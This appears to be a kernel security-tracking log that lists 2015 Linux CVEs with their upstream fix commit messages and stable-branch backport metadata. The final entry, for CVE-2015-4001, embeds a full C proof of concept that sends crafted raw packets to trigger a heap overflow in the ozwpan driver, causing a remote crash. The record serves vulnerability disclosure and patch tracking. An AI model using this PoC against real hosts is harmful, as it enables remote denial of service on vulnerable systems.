The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-05-27
CVE: CVE-2015-2666
Break Date: 2013-01-31
Break Commit: ec400ddeff200b068ddc6c70f7321f49ecf32ed5
Break Tag: 3.9
Linus Fix Date: 2015-02-19
Linus Commit: f84598bd7c851f8b0bf8cd0d7c3be0d73c432ff4
Linus Tag: 4.0
Stable Date: 2015-07-03
Stable Commit: 77544e78c388cc755c056f451b322dedba991c0a
Stable Tag: 3.14.47

CVE-2015-2672:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 06c8173eb92bbfc03a0fe8bb64315857d0badd06
Author: Quentin Casasnovas <quentin.casasnovas@oracle.com>
Date:   Thu Mar 5 13:19:22 2015 +0100

    x86/fpu/xsaves: Fix improper uses of __ex_table
    
    Commit:
    
      f31a9f7c7169 ("x86/xsaves: Use xsaves/xrstors to save and restore xsave area")
    
    introduced alternative instructions for XSAVES/XRSTORS and commit:
    
      adb9d526e982 ("x86/xsaves: Add xsaves and xrstors support for booting time")
    
    added support for the XSAVES/XRSTORS instructions at boot time.
    
    Unfortunately both failed to properly protect them against faulting:
    
    The 'xstate_fault' macro will use the closest label named '1'
    backward and that ends up in the .altinstr_replacement section
    rather than in .text. This means that the kernel will never find
    in the __ex_table the .text address where this instruction might
    fault, leading to serious problems if userspace manages to
    trigger the fault.
    
    Signed-off-by: Quentin Casasnovas <quentin.casasnovas@oracle.com>
    Signed-off-by: Jamie Iles <jamie.iles@oracle.com>
    [ Improved the changelog, fixed some whitespace noise. ]
    Acked-by: Borislav Petkov <bp@alien8.de>
    Acked-by: Linus Torvalds <torvalds@linux-foundation.org>
    Cc: <stable@vger.kernel.org>
    Cc: Allan Xavier <mr.a.xavier@gmail.com>
    Cc: H. Peter Anvin <hpa@zytor.com>
    Cc: Thomas Gleixner <tglx@linutronix.de>
    Fixes: adb9d526e982 ("x86/xsaves: Add xsaves and xrstors support for booting time")
    Fixes: f31a9f7c7169 ("x86/xsaves: Use xsaves/xrstors to save and restore xsave area")
    Signed-off-by: Ingo Molnar <mingo@kernel.org>

 arch/x86/include/asm/xsave.h |   28 +++++++++++-----------------
 1 file changed, 11 insertions(+), 17 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-02
CVE: CVE-2015-2672
Break Date: 2014-05-29
Break Commit: f31a9f7c71691569359fa7fb8b0acaa44bce0324
Break Tag: 3.17
Linus Fix Date: 2015-03-05
Linus Commit: 06c8173eb92bbfc03a0fe8bb64315857d0badd06
Linus Tag: 4.0
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-2686:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 4de930efc23b92ddf88ce91c405ee645fe6e27ea
Author: Al Viro <viro@ZenIV.linux.org.uk>
Date:   Fri Mar 20 17:41:43 2015 +0000

    net: validate the range we feed to iov_iter_init() in sys_sendto/sys_recvfrom
    
    Cc: stable@vger.kernel.org # v3.19
    Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/socket.c |    4 ++++
 1 file changed, 4 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-02
CVE: CVE-2015-2686
Break Date: 2014-12-09
Break Commit: c0371da6047abd261bc483c744dbc7d81a116172
Break Tag: 3.19
Linus Fix Date: 2015-03-20
Linus Commit: 4de930efc23b92ddf88ce91c405ee645fe6e27ea
Linus Tag: 4.0
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-2830:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.36.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 956421fbb74c3a6261903f3836c0740187cf038b
Author: Andy Lutomirski <luto@amacapital.net>
Date:   Thu Mar 5 01:09:44 2015 +0100

    x86/asm/entry/64: Remove a bogus 'ret_from_fork' optimization
    
    'ret_from_fork' checks TIF_IA32 to determine whether 'pt_regs' and
    the related state make sense for 'ret_from_sys_call'.  This is
    entirely the wrong check.  TS_COMPAT would make a little more
    sense, but there's really no point in keeping this optimization
    at all.
    
    This fixes a return to the wrong user CS if we came from int
    0x80 in a 64-bit task.
    
    Signed-off-by: Andy Lutomirski <luto@amacapital.net>
    Cc: Borislav Petkov <bp@alien8.de>
    Cc: Denys Vlasenko <dvlasenk@redhat.com>
    Cc: H. Peter Anvin <hpa@zytor.com>
    Cc: Linus Torvalds <torvalds@linux-foundation.org>
    Cc: Oleg Nesterov <oleg@redhat.com>
    Cc: Thomas Gleixner <tglx@linutronix.de>
    Cc: <stable@vger.kernel.org>
    Link: http://lkml.kernel.org/r/4710be56d76ef994ddf59087aad98c000fbab9a4.1424989793.git.luto@amacapital.net
    [ Backported from tip:x86/asm. ]
    Signed-off-by: Ingo Molnar <mingo@kernel.org>

 arch/x86/kernel/entry_64.S |   13 ++++++++-----
 1 file changed, 8 insertions(+), 5 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-05-27
CVE: CVE-2015-2830
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-03-05
Linus Commit: 956421fbb74c3a6261903f3836c0740187cf038b
Linus Tag: 4.0
Stable Date: 2015-03-18
Stable Commit: 213c9f19d733b067b278901acf49d67e805a38b0
Stable Tag: 3.14.36

CVE-2015-2922:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.40.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 6fd99094de2b83d1d4c8457f2c83483b2828e75a
Author: D.S. Ljungmark <ljungmark@modio.se>
Date:   Wed Mar 25 09:28:15 2015 +0100

    ipv6: Don't reduce hop limit for an interface
    
    A local route may have a lower hop_limit set than global routes do.
    
    RFC 3756, Section 4.2.7, "Parameter Spoofing"
    
    >   1.  The attacker includes a Current Hop Limit of one or another small
    >       number which the attacker knows will cause legitimate packets to
    >       be dropped before they reach their destination.
    
    >   As an example, one possible approach to mitigate this threat is to
    >   ignore very small hop limits.  The nodes could implement a
    >   configurable minimum hop limit, and ignore attempts to set it below
    >   said limit.
    
    Signed-off-by: D.S. Ljungmark <ljungmark@modio.se>
    Acked-by: Hannes Frederic Sowa <hannes@stressinduktion.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/ipv6/ndisc.c |    9 ++++++++-
 1 file changed, 8 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-05-27
CVE: CVE-2015-2922
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-03-25
Linus Commit: 6fd99094de2b83d1d4c8457f2c83483b2828e75a
Linus Tag: 4.0
Stable Date: 2015-04-29
Stable Commit: 01f69adac109867f892f12057660d891b34182f6
Stable Tag: 3.14.40

CVE-2015-2925:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.55.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 397d425dc26da728396e66d392d5dcb8dac30c37
Author: Eric W. Biederman <ebiederm@xmission.com>
Date:   Sat Aug 15 20:27:13 2015 -0500

    vfs: Test for and handle paths that are unreachable from their mnt_root
    
    In rare cases a directory can be renamed out from under a bind mount.
    In those cases without special handling it becomes possible to walk up
    the directory tree to the root dentry of the filesystem and down
    from the root dentry to every other file or directory on the filesystem.
    
    Like division by zero .. from an unconnected path can not be given
    a useful semantic as there is no predicting at which path component
    the code will realize it is unconnected.  We certainly can not match
    the current behavior as the current behavior is a security hole.
    
    Therefore when encounting .. when following an unconnected path
    return -ENOENT.
    
    - Add a function path_connected to verify path->dentry is reachable
      from path->mnt.mnt_root.  AKA to validate that rename did not do
      something nasty to the bind mount.
    
      To avoid races path_connected must be called after following a path
      component to it's next path component.
    
    Signed-off-by: "Eric W. Biederman" <ebiederm@xmission.com>
    Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>

 fs/namei.c |   27 +++++++++++++++++++++++++--
 1 file changed, 25 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-11-16
CVE: CVE-2015-2925
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-08-21
Linus Commit: 397d425dc26da728396e66d392d5dcb8dac30c37
Linus Tag: 4.3
Stable Date: 2015-10-22
Stable Commit: 27fa5a5ee0e2b2556ce59c0ad04f606635fa6392
Stable Tag: 3.14.55

CVE-2015-2925:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.55.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit cde93be45a8a90d8c264c776fab63487b5038a65
Author: Eric W. Biederman <ebiederm@xmission.com>
Date:   Sat Aug 15 13:36:12 2015 -0500

    dcache: Handle escaped paths in prepend_path
    
    A rename can result in a dentry that by walking up d_parent
    will never reach it's mnt_root.  For lack of a better term
    I call this an escaped path.
    
    prepend_path is called by four different functions __d_path,
    d_absolute_path, d_path, and getcwd.
    
    __d_path only wants to see paths are connected to the root it passes
    in.  So __d_path needs prepend_path to return an error.
    
    d_absolute_path similarly wants to see paths that are connected to
    some root.  Escaped paths are not connected to any mnt_root so
    d_absolute_path needs prepend_path to return an error greater
    than 1.  So escaped paths will be treated like paths on lazily
    unmounted mounts.
    
    getcwd needs to prepend "(unreachable)" so getcwd also needs
    prepend_path to return an error.
    
    d_path is the interesting hold out.  d_path just wants to print
    something, and does not care about the weird cases.  Which raises
    the question what should be printed?
    
    Given that <escaped_path>/<anything> should result in -ENOENT I
    believe it is desirable for escaped paths to be printed as empty
    paths.  As there are not really any meaninful path components when
    considered from the perspective of a mount tree.
    
    So tweak prepend_path to return an empty path with an new error
    code of 3 when it encounters an escaped path.
    
    Signed-off-by: "Eric W. Biederman" <ebiederm@xmission.com>
    Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>

 fs/dcache.c |    7 +++++++
 1 file changed, 7 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-11-16
CVE: CVE-2015-2925
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-08-21
Linus Commit: cde93be45a8a90d8c264c776fab63487b5038a65
Linus Tag: 4.3
Stable Date: 2015-10-22
Stable Commit: cb1320693b9d8d32651a2bb7cd15498408732b8f
Stable Tag: 3.14.55

CVE-2015-3212:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.48.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 2d45a02d0166caf2627fe91897c6ffc3b19514c4
Author: Marcelo Ricardo Leitner <marcelo.leitner@gmail.com>
Date:   Fri Jun 12 10:16:41 2015 -0300

    sctp: fix ASCONF list handling
    
    ->auto_asconf_splist is per namespace and mangled by functions like
    sctp_setsockopt_auto_asconf() which doesn't guarantee any serialization.
    
    Also, the call to inet_sk_copy_descendant() was backuping
    ->auto_asconf_list through the copy but was not honoring
    ->do_auto_asconf, which could lead to list corruption if it was
    different between both sockets.
    
    This commit thus fixes the list handling by using ->addr_wq_lock
    spinlock to protect the list. A special handling is done upon socket
    creation and destruction for that. Error handlig on sctp_init_sock()
    will never return an error after having initialized asconf, so
    sctp_destroy_sock() can be called without addrq_wq_lock. The lock now
    will be take on sctp_close_sock(), before locking the socket, so we
    don't do it in inverse order compared to sctp_addr_wq_timeout_handler().
    
    Instead of taking the lock on sctp_sock_migrate() for copying and
    restoring the list values, it's preferred to avoid rewritting it by
    implementing sctp_copy_descendant().
    
    Issue was found with a test application that kept flipping sysctl
    default_auto_asconf on and off, but one could trigger it by issuing
    simultaneous setsockopt() calls on multiple sockets or by
    creating/destroying sockets fast enough. This is only triggerable
    locally.
    
    Fixes: 9f7d653b67ae ("sctp: Add Auto-ASCONF support (core).")
    Reported-by: Ji Jianwen <jiji@redhat.com>
    Suggested-by: Neil Horman <nhorman@tuxdriver.com>
    Suggested-by: Hannes Frederic Sowa <hannes@stressinduktion.org>
    Acked-by: Hannes Frederic Sowa <hannes@stressinduktion.org>
    Signed-off-by: Marcelo Ricardo Leitner <marcelo.leitner@gmail.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/net/netns/sctp.h   |    1 +
 include/net/sctp/structs.h |    4 ++++
 net/sctp/socket.c          |   43 ++++++++++++++++++++++++++++++++-----------
 3 files changed, 37 insertions(+), 11 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-08-31
CVE: CVE-2015-3212
Break Date: 2011-06-02
Break Commit: 9f7d653b67aed2d92540fbb0a8adaf32fcf352ae
Break Tag: 3.1
Linus Fix Date: 2015-06-14
Linus Commit: 2d45a02d0166caf2627fe91897c6ffc3b19514c4
Linus Tag: 4.2
Stable Date: 2015-07-10
Stable Commit: 21eceec537c215824aa5939c0a4aab4a5a8978a4
Stable Tag: 3.14.48

CVE-2015-3288:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.50.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 6b7339f4c31ad69c8e9c0b2859276e22cf72176d
Author: Kirill A. Shutemov <kirill.shutemov@linux.intel.com>
Date:   Mon Jul 6 23:18:37 2015 +0300

    mm: avoid setting up anonymous pages into file mapping
    
    Reading page fault handler code I've noticed that under right
    circumstances kernel would map anonymous pages into file mappings: if
    the VMA doesn't have vm_ops->fault() and the VMA wasn't fully populated
    on ->mmap(), kernel would handle page fault to not populated pte with
    do_anonymous_page().
    
    Let's change page fault handler to use do_anonymous_page() only on
    anonymous VMA (->vm_ops == NULL) and make sure that the VMA is not
    shared.
    
    For file mappings without vm_ops->fault() or shred VMA without vm_ops,
    page fault on pte_none() entry would lead to SIGBUS.
    
    Signed-off-by: Kirill A. Shutemov <kirill.shutemov@linux.intel.com>
    Acked-by: Oleg Nesterov <oleg@redhat.com>
    Cc: Andrew Morton <akpm@linux-foundation.org>
    Cc: Willy Tarreau <w@1wt.eu>
    Cc: stable@vger.kernel.org
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 mm/memory.c |   20 +++++++++++++-------
 1 file changed, 13 insertions(+), 7 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2015-3288
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-07-09
Linus Commit: 6b7339f4c31ad69c8e9c0b2859276e22cf72176d
Linus Tag: 4.2
Stable Date: 2015-08-10
Stable Commit: 9f7fa1bc5fb4414a75ea451859154a9930e47daf
Stable Tag: 3.14.50

CVE-2015-3290:
CVE-2015-5157:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.54.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 9b6e6a8334d56354853f9c255d1395c2ba570e0a
Author: Andy Lutomirski <luto@kernel.org>
Date:   Wed Jul 15 10:29:35 2015 -0700

    x86/nmi/64: Switch stacks on userspace NMI entry
    
    Returning to userspace is tricky: IRET can fail, and ESPFIX can
    rearrange the stack prior to IRET.
    
    The NMI nesting fixup relies on a precise stack layout and
    atomic IRET.  Rather than trying to teach the NMI nesting fixup
    to handle ESPFIX and failed IRET, punt: run NMIs that came from
    user mode on the normal kernel stack.
    
    This will make some nested NMIs visible to C code, but the C
    code is okay with that.
    
    As a side effect, this should speed up perf: it eliminates an
    RDMSR when NMIs come from user mode.
    
    Signed-off-by: Andy Lutomirski <luto@kernel.org>
    Reviewed-by: Steven Rostedt <rostedt@goodmis.org>
    Reviewed-by: Borislav Petkov <bp@suse.de>
    Cc: Linus Torvalds <torvalds@linux-foundation.org>
    Cc: Peter Zijlstra <peterz@infradead.org>
    Cc: Thomas Gleixner <tglx@linutronix.de>
    Cc: stable@vger.kernel.org
    Signed-off-by: Ingo Molnar <mingo@kernel.org>

 arch/x86/entry/entry_64.S |   62 ++++++++++++++++++++++++++++++++++++++++++---
 1 file changed, 58 insertions(+), 4 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-08-31
CVE: CVE-2015-3290
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-07-17
Linus Commit: 9b6e6a8334d56354853f9c255d1395c2ba570e0a
Linus Tag: 4.2
Stable Date: 2015-10-01
Stable Commit: 66af900f21c6b0b1b59ac156245ca8d2b5d7b696
Stable Tag: 3.14.54

CVE-2015-3291:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.54.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 810bc075f78ff2c221536eb3008eac6a492dba2d
Author: Andy Lutomirski <luto@kernel.org>
Date:   Wed Jul 15 10:29:38 2015 -0700

    x86/nmi/64: Use DF to avoid userspace RSP confusing nested NMI detection
    
    We have a tricky bug in the nested NMI code: if we see RSP
    pointing to the NMI stack on NMI entry from kernel mode, we
    assume that we are executing a nested NMI.
    
    This isn't quite true.  A malicious userspace program can point
    RSP at the NMI stack, issue SYSCALL, and arrange for an NMI to
    happen while RSP is still pointing at the NMI stack.
    
    Fix it with a sneaky trick.  Set DF in the region of code that
    the RSP check is intended to detect.  IRET will clear DF
    atomically.
    
    ( Note: other than paravirt, there's little need for all this
      complexity. We could check RIP instead of RSP. )
    
    Signed-off-by: Andy Lutomirski <luto@kernel.org>
    Reviewed-by: Steven Rostedt <rostedt@goodmis.org>
    Cc: Borislav Petkov <bp@suse.de>
    Cc: Linus Torvalds <torvalds@linux-foundation.org>
    Cc: Peter Zijlstra <peterz@infradead.org>
    Cc: Thomas Gleixner <tglx@linutronix.de>
    Cc: stable@vger.kernel.org
    Signed-off-by: Ingo Molnar <mingo@kernel.org>

 arch/x86/entry/entry_64.S |   29 +++++++++++++++++++++++++----
 1 file changed, 25 insertions(+), 4 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-08-31
CVE: CVE-2015-3291
Break Date: 2011-12-21
Break Commit: 3f3c8b8c4b2a34776c3470142a7c8baafcda6eb0
Break Tag: 3.3
Linus Fix Date: 2015-07-17
Linus Commit: 810bc075f78ff2c221536eb3008eac6a492dba2d
Linus Tag: 4.2
Stable Date: 2015-10-01
Stable Commit: 5f521316a9d5c70842744b8f3f872ab1a932711b
Stable Tag: 3.14.54

CVE-2015-3331:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.37.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit ccfe8c3f7e52ae83155cb038753f4c75b774ca8a
Author: Stephan Mueller <smueller@chronox.de>
Date:   Thu Mar 12 09:17:51 2015 +0100

    crypto: aesni - fix memory usage in GCM decryption
    
    The kernel crypto API logic requires the caller to provide the
    length of (ciphertext || authentication tag) as cryptlen for the
    AEAD decryption operation. Thus, the cipher implementation must
    calculate the size of the plaintext output itself and cannot simply use
    cryptlen.
    
    The RFC4106 GCM decryption operation tries to overwrite cryptlen memory
    in req->dst. As the destination buffer for decryption only needs to hold
    the plaintext memory but cryptlen references the input buffer holding
    (ciphertext || authentication tag), the assumption of the destination
    buffer length in RFC4106 GCM operation leads to a too large size. This
    patch simply uses the already calculated plaintext size.
    
    In addition, this patch fixes the offset calculation of the AAD buffer
    pointer: as mentioned before, cryptlen already includes the size of the
    tag. Thus, the tag does not need to be added. With the addition, the AAD
    will be written beyond the already allocated buffer.
    
    Note, this fixes a kernel crash that can be triggered from user space
    via AF_ALG(aead) -- simply use the libkcapi test application
    from [1] and update it to use rfc4106-gcm-aes.
    
    Using [1], the changes were tested using CAVS vectors to demonstrate
    that the crypto operation still delivers the right results.
    
    [1] http://www.chronox.de/libkcapi.html
    
    CC: Tadeusz Struk <tadeusz.struk@intel.com>
    Cc: stable@vger.kernel.org
    Signed-off-by: Stephan Mueller <smueller@chronox.de>
    Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>

 arch/x86/crypto/aesni-intel_glue.c |    4 ++--
 1 file changed, 2 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-05-27
CVE: CVE-2015-3331
Break Date: 2010-11-13
Break Commit: 0bd82f5f6355775fbaf7d3c664432ce1b862be1e
Break Tag: 2.6
Linus Fix Date: 2015-03-13
Linus Commit: ccfe8c3f7e52ae83155cb038753f4c75b774ca8a
Linus Tag: 4.0
Stable Date: 2015-03-26
Stable Commit: e9b15363c10104a0823e5e2d360eab188f2b122f
Stable Tag: 3.14.37

CVE-2015-3332:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-05-27
CVE: CVE-2015-3332
Break Date: 2014-11-19
Break Commit: 355a901e6cf1b2b763ec85caa2a9f04fbcc4ab4a
Break Tag: 3.19
Linus Fix Date: -
Linus Commit: local-2015-3332
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-3636:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.42.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit a134f083e79fb4c3d0a925691e732c56911b4326
Author: David S. Miller <davem@davemloft.net>
Date:   Fri May 1 22:02:47 2015 -0400

    ipv4: Missing sk_nulls_node_init() in ping_unhash().
    
    If we don't do that, then the poison value is left in the ->pprev
    backlink.
    
    This can cause crashes if we do a disconnect, followed by a connect().
    
    Tested-by: Linus Torvalds <torvalds@linux-foundation.org>
    Reported-by: Wen Xu <hotdog3645@gmail.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/ipv4/ping.c |    1 +
 1 file changed, 1 insertion(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-08-05
CVE: CVE-2015-3636
Break Date: 2011-05-13
Break Commit: c319b4d76b9e583a5d88d6bf190e079c4e43213d
Break Tag: 3.0
Linus Fix Date: 2015-05-01
Linus Commit: a134f083e79fb4c3d0a925691e732c56911b4326
Linus Tag: 4.1
Stable Date: 2015-05-13
Stable Commit: f493b53864236c924b61ef3ccbb759ac46419a32
Stable Tag: 3.14.42

CVE-2015-4001:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit b1bb5b49373b61bf9d2c73a4d30058ba6f069e4c
Author: Jason A. Donenfeld <Jason@zx2c4.com>
Date:   Fri May 29 13:06:59 2015 +0200

    ozwpan: Use unsigned ints to prevent heap overflow
    
    Using signed integers, the subtraction between required_size and offset
    could wind up being negative, resulting in a memcpy into a heap buffer
    with a negative length, resulting in huge amounts of network-supplied
    data being copied into the heap, which could potentially lead to remote
    code execution.. This is remotely triggerable with a magic packet.
    A PoC which obtains DoS follows below. It requires the ozprotocol.h file
    from this module.
    
    =-=-=-=-=-=
    
     #include <arpa/inet.h>
     #include <linux/if_packet.h>
     #include <net/if.h>
     #include <netinet/ether.h>
     #include <stdio.h>
     #include <string.h>
     #include <stdlib.h>
     #include <endian.h>
     #include <sys/ioctl.h>
     #include <sys/socket.h>
    
     #define u8 uint8_t
     #define u16 uint16_t
     #define u32 uint32_t
     #define __packed __attribute__((__packed__))
     #include "ozprotocol.h"
    
    static int hex2num(char c)
    {
    	if (c >= '0' && c <= '9')
    		return c - '0';
    	if (c >= 'a' && c <= 'f')
    		return c - 'a' + 10;
    	if (c >= 'A' && c <= 'F')
    		return c - 'A' + 10;
    	return -1;
    }
    static int hwaddr_aton(const char *txt, uint8_t *addr)
    {
    	int i;
    	for (i = 0; i < 6; i++) {
    		int a, b;
    		a = hex2num(*txt++);
    		if (a < 0)
    			return -1;
    		b = hex2num(*txt++);
    		if (b < 0)
    			return -1;
    		*addr++ = (a << 4) | b;
    		if (i < 5 && *txt++ != ':')
    			return -1;
    	}
    	return 0;
    }
    
    int main(int argc, char *argv[])
    {
    	if (argc < 3) {
    		fprintf(stderr, "Usage: %s interface destination_mac\n", argv[0]);
    		return 1;
    	}
    
    	uint8_t dest_mac[6];
    	if (hwaddr_aton(argv[2], dest_mac)) {
    		fprintf(stderr, "Invalid mac address.\n");
    		return 1;
    	}
    
    	int sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
    	if (sockfd < 0) {
    		perror("socket");
    		return 1;
    	}
    
    	struct ifreq if_idx;
    	int interface_index;
    	strncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1);
    	if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {
    		perror("SIOCGIFINDEX");
    		return 1;
    	}
    	interface_index = if_idx.ifr_ifindex;
    	if (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) {
    		perror("SIOCGIFHWADDR");
    		return 1;
    	}
    	uint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;
    
    	struct {
    		struct ether_header ether_header;
    		struct oz_hdr oz_hdr;
    		struct oz_elt oz_elt;
    		struct oz_elt_connect_req oz_elt_connect_req;
    	} __packed connect_packet = {
    		.ether_header = {
    			.ether_type = htons(OZ_ETHERTYPE),
    			.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },
    			.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
    		},
    		.oz_hdr = {
    			.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),
    			.last_pkt_num = 0,
    			.pkt_num = htole32(0)
    		},
    		.oz_elt = {
    			.type = OZ_ELT_CONNECT_REQ,
    			.length = sizeof(struct oz_elt_connect_req)
    		},
    		.oz_elt_connect_req = {
    			.mode = 0,
    			.resv1 = {0},
    			.pd_info = 0,
    			.session_id = 0,
    			.presleep = 35,
    			.ms_isoc_latency = 0,
    			.host_vendor = 0,
    			.keep_alive = 0,
    			.apps = htole16((1 << OZ_APPID_USB) | 0x1),
    			.max_len_div16 = 0,
    			.ms_per_isoc = 0,
    			.up_audio_buf = 0,
    			.ms_per_elt = 0
    		}
    	};
    
    	struct {
    		struct ether_header ether_header;
    		struct oz_hdr oz_hdr;
    		struct oz_elt oz_elt;
    		struct oz_get_desc_rsp oz_get_desc_rsp;
    	} __packed pwn_packet = {
    		.ether_header = {
    			.ether_type = htons(OZ_ETHERTYPE),
    			.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },
    			.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
    		},
    		.oz_hdr = {
    			.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),
    			.last_pkt_num = 0,
    			.pkt_num = htole32(1)
    		},
    		.oz_elt = {
    			.type = OZ_ELT_APP_DATA,
    			.length = sizeof(struct oz_get_desc_rsp)
    		},
    		.oz_get_desc_rsp = {
    			.app_id = OZ_APPID_USB,
    			.elt_seq_num = 0,
    			.type = OZ_GET_DESC_RSP,
    			.req_id = 0,
    			.offset = htole16(2),
    			.total_size = htole16(1),
    			.rcode = 0,
    			.data = {0}
    		}
    	};
    
    	struct sockaddr_ll socket_address = {
    		.sll_ifindex = interface_index,
    		.sll_halen = ETH_ALEN,
    		.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
    	};
    
    	if (sendto(sockfd, &connect_packet, sizeof(connect_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
    		perror("sendto");
    		return 1;
    	}
    	usleep(300000);
    	if (sendto(sockfd, &pwn_packet, sizeof(pwn_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
    		perror("sendto");
    		return 1;
    	}
    	return 0;
    }
    
    Signed-off-by: Jason A. Donenfeld <Jason@zx2c4.com>
    Acked-by: Dan Carpenter <dan.carpenter@oracle.com>
    Cc: stable <stable@vger.kernel.org>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

 drivers/staging/ozwpan/ozhcd.c   |    8 ++++----
 drivers/staging/ozwpan/ozusbif.h |    4 ++--
 2 files changed, 6 insertions(+), 6 deletions(-)
---
